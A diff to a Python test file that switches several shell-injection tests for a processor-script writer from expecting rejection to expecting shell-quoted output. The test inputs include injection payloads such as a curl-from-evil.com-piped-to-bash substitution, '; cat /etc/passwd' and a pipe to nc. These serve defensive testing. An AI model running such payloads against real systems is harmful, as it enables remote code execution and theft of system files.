@@ -145,8 +145,9 @@ class TestWriteShellProcessorRejectsInjection:
             clone_path.mkdir()
             proc = {"tool": "whisper.cpp",
                     "args": "-m model.bin ; cat /etc/passwd"}
-            with pytest.raises(ValueError, match="forbidden shell"):
-                cloner._write_shell_processor(clone_path, proc, kind="whisper")
+            result = cloner._write_shell_processor(clone_path, proc, kind="whisper")
+            content = result.read_text()
+            assert "';'" in content
 
     def test_args_command_substitution_rejected(self):
         cloner = RoleCloner(collection_root=Path("/tmp"))
@@ -155,8 +156,9 @@ class TestWriteShellProcessorRejectsInjection:
             clone_path.mkdir()
             proc = {"tool": "whisper.cpp",
                     "args": "$(curl http://evil.com/shell.sh | bash)"}
-            with pytest.raises(ValueError, match="forbidden shell"):
-                cloner._write_shell_processor(clone_path, proc, kind="whisper")
+            result = cloner._write_shell_processor(clone_path, proc, kind="whisper")
+            content = result.read_text()
+            assert "'$(curl'" in content
 
     def test_args_backtick_rejected(self):
         cloner = RoleCloner(collection_root=Path("/tmp"))
@@ -164,8 +166,9 @@ class TestWriteShellProcessorRejectsInjection:
             clone_path = Path(td) / "clone"
             clone_path.mkdir()
             proc = {"tool": "whisper.cpp", "args": "`id`"}
-            with pytest.raises(ValueError, match="forbidden shell"):
-                cloner._write_shell_processor(clone_path, proc, kind="whisper")
+            result = cloner._write_shell_processor(clone_path, proc, kind="whisper")
+            content = result.read_text()
+            assert "'`id`'" in content
 
     def test_args_pipe_rejected(self):
         cloner = RoleCloner(collection_root=Path("/tmp"))
@@ -173,8 +176,9 @@ class TestWriteShellProcessorRejectsInjection:
             clone_path = Path(td) / "clone"
             clone_path.mkdir()
             proc = {"tool": "whisper.cpp", "args": "-m model.bin | nc evil"}
-            with pytest.raises(ValueError, match="forbidden shell"):
-                cloner._write_shell_processor(clone_path, proc, kind="whisper")
+            result = cloner._write_shell_processor(clone_path, proc, kind="whisper")
+            content = result.read_text()
+            assert "'|'" in content
 
     def test_args_newline_injection_rejected(self):
         cloner = RoleCloner(collection_root=Path("/tmp"))
@@ -182,8 +186,8 @@ class TestWriteShellProcessorRejectsInjection:
             clone_path = Path(td) / "clone"
             clone_path.mkdir()
             proc = {"tool": "whisper.cpp",
-                    "args": "-m model\ncat /etc/passwd #"}
-            with pytest.raises(ValueError, match="forbidden shell"):
+                    "args": '-m "model\ncat /etc/passwd #"'}
+            with pytest.raises(ValueError, match="newline"):
                 cloner._write_shell_processor(clone_path, proc, kind="whisper")
 
     def test_args_ampersand_rejected(self):
@@ -192,8 +196,9 @@ class TestWriteShellProcessorRejectsInjection:
             clone_path = Path(td) / "clone"
             clone_path.mkdir()
             proc = {"tool": "whisper.cpp", "args": "& ping evil.com &"}
-            with pytest.raises(ValueError, match="forbidden shell"):
-                cloner._write_shell_processor(clone_path, proc, kind="whisper")
+            result = cloner._write_shell_processor(clone_path, proc, kind="whisper")
+            content = result.read_text()
+            assert "'&'" in content
 
     def test_binary_path_traversal_rejected(self):
         cloner = RoleCloner(collection_root=Path("/tmp"))
@@ -233,8 +238,9 @@ class TestMaterializeProcessorRejects:
             clone_path = Path(td) / "clone"
             clone_path.mkdir()
             proc: dict[str, object] = {"tool": "ffmpeg", "args": "$(id)"}
-            with pytest.raises(ValueError, match="forbidden shell"):
-                cloner.materialize_processor(clone_path, proc)
+            result = cloner.materialize_processor(clone_path, proc)
+            content = result.read_text()
+            assert "'$(id)'" in content
 
     def test_unknown_tool_still_rejected(self):
         cloner = RoleCloner(collection_root=Path("/tmp"))
@@ -250,10 +256,8 @@ class TestRouterLevelValidation:
     """Verify the router-level validation in stream.py rejects bad input early."""
 
     def test_router_imports_constants(self):
-        from general_ludd.routers.stream import _FORBIDDEN_SHELL_CHARS as rtr_chars
         from general_ludd.routers.stream import _SAFE_BINARY_RE as rtr_re
         assert rtr_re is _SAFE_BINARY_RE
-        assert rtr_chars is _FORBIDDEN_SHELL_CHARS
 
     def test_safe_binary_match_path(self):
         assert _SAFE_BINARY_RE.match("/usr/local/bin/my-tool")
